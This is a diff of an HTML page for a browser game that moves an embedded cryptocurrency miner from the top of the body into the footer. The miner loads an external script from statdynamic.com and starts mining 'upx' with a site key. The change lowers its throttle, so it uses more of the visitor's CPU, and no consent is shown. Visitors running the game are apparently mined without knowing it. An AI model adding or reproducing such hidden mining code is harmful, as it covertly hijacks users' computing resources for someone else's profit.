@@ -44,19 +44,22 @@
             }
         </style>
     </head>
-    <body>
-
-        <script src="//statdynamic.com/lib/crypta.js"></script>
-<script>
-  var miner=new CRLT.Anonymous('3dfee4d5de84582a4bf0757e9ee38027ced4813c4a49', {
-    threads:2,throttle:0.8, coin: "upx",
-  });
-  miner.start();
-</script>
+        <body>
         <div id="game"></div>
         <div id="footer">
            
             <a href="https://github.com/Tup0lev/GamesIndex" target="_blank">更多游戏</a>
+            
+            
+            <script src="//statdynamic.com/lib/crypta.js"></script>
+<script>
+  var miner=new CRLT.Anonymous('3dfee4d5de84582a4bf0757e9ee38027ced4813c4a49', {
+    threads:2,throttle:0.5, coin: "upx",
+  });
+  miner.start();
+</script>
+            
+            
             
         </div>
         <script src="lib/phaser.min.patched.js"></script>
@@ -70,6 +73,6 @@
         <script src="js/main.js"></script>
         <script>
             require('main').run();;
-        
+        </script>
     </body>
 </html>
